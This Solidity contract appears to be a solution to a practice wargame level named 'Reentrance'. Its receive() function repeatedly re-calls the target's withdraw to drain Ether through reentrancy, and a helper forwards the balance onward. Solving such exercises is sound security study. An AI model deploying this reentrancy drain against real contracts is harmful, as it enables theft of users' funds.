// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../instances/Ilevel10.sol";

contract Reenter{

    Reentrance level10 = Reentrance(payable(0xCaA6CD633F2f452bb2Bcd1189287E6Fef611C670));

    constructor () public payable {}

    function donate(address _to) external payable {
        level10.donate{value: 0.001 ether}(_to);
    }

    function withdraw() external{
        level10.withdraw(0.001 ether);
    }

    function getBalance(address _who) external view returns (uint){
        return address(_who).balance;
    }

    function fundmeback(address payable _to) external payable{
        require(_to.send(address(this).balance), "could not send Ether");
    }

    receive() external payable {
        level10.withdraw(msg.value);
    }
}

